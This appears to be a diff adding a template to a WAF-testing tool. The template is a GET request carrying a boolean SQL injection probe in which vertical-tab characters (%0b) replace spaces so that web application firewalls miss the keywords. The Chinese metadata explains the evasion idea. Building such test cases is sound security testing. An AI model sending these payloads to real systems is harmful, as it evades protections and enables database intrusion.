@@ -1,0 +1,13 @@
+# @name: 垂直制表符%0b替代空格
+# @tags: get,sqli,whitespace,vtab,id,bypass
+# @color: rose
+# @validate: baseline_similarity
+# @threshold: 0.90
+# @intent: replace_space
+# @intent.replace_from: " "
+# @intent.replace_to: %0b
+# @note: 用垂直制表符 %0b 替代空格（SQLMap between/space2plus 系列思路），不少 WAF 不把 %0b 识别为空白字符，从而漏检关键字。
+GET /?id=1'%0band%0b'a'='a HTTP/1.1
+Host: {{TARGET_HOST_HEADER}}
+User-Agent: {{USER_AGENT}}
+
